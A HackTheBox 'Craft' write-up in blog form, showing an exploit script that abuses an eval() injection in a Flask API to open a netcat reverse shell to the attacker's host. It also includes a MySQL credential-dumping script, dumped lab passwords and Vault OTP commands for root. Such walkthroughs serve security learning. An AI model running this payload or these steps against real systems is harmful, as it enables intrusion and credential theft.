---
title: "HackTheBox - WriteUp 15"
date: 2019-07-16T16:23:16+08:00
description: "HackTheBox 练手 - Craft - Code review"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Craft

Nmap enum found 22(SSH on Host), 6022(SSH on Gogs), 443(Web with Nginx)

## User

Add following lines to `/etc/hosts`:

```
10.10.10.110 api.craft.htb
10.10.10.110 craft.htb
10.10.10.110 gogs.craft.htb
```

Access 443 Port, then found a page telling you based on the API. So Firstly, Access API definition at `api.craft.htb/api/`, Then Clone the API repo `craft-api` from Gogs link inside the index.

After clone, do code review: `./craft_api/api/brew/endpoints/brew.py:43:        if eval('%s > 1' % request.json['abv'])`, that will allow you to spawn a Python reverse shell.

Check the commit log and Issue, you'll have the details and a credential.

So, Since Here, We can write a script to automate the reverse shell process:

```python
#!/usr/bin/env python3

import requests
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

HOST="10.10.16.80"
PORT="4455"

notistr = "Do you already start a netcat listen on your machine as IP {ATTACKH}:{ATTACKP}? (Y/N)".format(ATTACKH=HOST, ATTACKP=PORT)
confirm = input(notistr)
if confirm.upper() != "Y":
    print("Please open nc first!")
    sys.exit(1)


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

get_apikey = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False, timeout=10)
json_response = get_apikey.json()
token = json_response['token']

print("Token!\n")
print(token)

apikeynm = "X-Craft-Api-Token"

custom_head = {apikeynm: token}

payload = {
    "id": 1,
    "brewer": "lesme",
    "name": "lesme",
    "style": "lesme",
    "abv": None
}

abvpld = "__import__('os').system('rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc {ATTACKH} {ATTACKP} >/tmp/f2')-2".format(ATTACKH=HOST, ATTACKP=PORT)
payload["abv"] = abvpld

print("\nPayload: \n")
print(payload)

push_revsh = requests.post("https://api.craft.htb/api/brew/", headers=custom_head, json=payload, verify=False)
if push_revsh.status_code == 500:
    print("Status code 500, reverse shell might be ok!")
else:
    print("Seems failed! Check the credentials!")
```

Then you have a reverse shell. Now check `/opt/app/craft_api/settings.py`, you'll get a mysql credential, since the app itself is a Python Flask-SQLAlchemy App, it already installed Pymysql.

So, Scripting again, run it on the reverse shell you just got:

```python
#!/usr/bin/python

import pymysql

DB_USER = 'craft'
DB_PASSWD = 'qLGockJ6G2J75O'
DB_DB = 'craft'
DB_HOST = 'db'

connection = pymysql.connect(host=DB_HOST, user=DB_USER, password=DB_PASSWD, charset='utf8', db=DB_DB, cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql1 = "select * from user;"
        cursor.execute(sql1)
        print(cursor.fetchall())
except:
    print("error detected")
finally:
    connection.close()
```

You'll get dumped user credentials:

```
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

User `gilfoyle` is a privileged user, so you can use it login to gogs to check the repos, you will found a `.ssh` keypair with the passphrase, you can use the same password as `gilfoyle` to login into port 22.

Then with the interactive shell, you can get the user.txt.

## Root

It's installed and configured with Vault, a passport management software, so, you just need to issue the three command to read about the OTP creds, then issue a SSH sessions. Copy OTP token it showed, paste into the SSH Passwords, you'll get a root SSH interactive shell.

```bash
$ vault secrets tune ssh
$ vault read ssh/roles/root_otp
$ vault ssh -role root_otp -mode otp root@127.0.0.1
```

You can read the root flag now.

(END)

# Referrence

- https://stackoverflow.com/questions/15401012/difference-between-import-and-import-in-python
- https://stackoverflow.com/questions/46175875/comparison-import-statement-vs-import-function
- https://stackoverflow.com/questions/28231738/import-vs-import-vs-importlib-import-module
- https://mariadb.com/kb/en/library/authentication-plugin-sha-256/
https://mysqlserverteam.com/mysql-8-0-4-new-default-authentication-plugin-caching_sha2_password/
- https://stackoverflow.com/questions/49194719/authentication-plugin-caching-sha2-password-cannot-be-loaded
- https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html
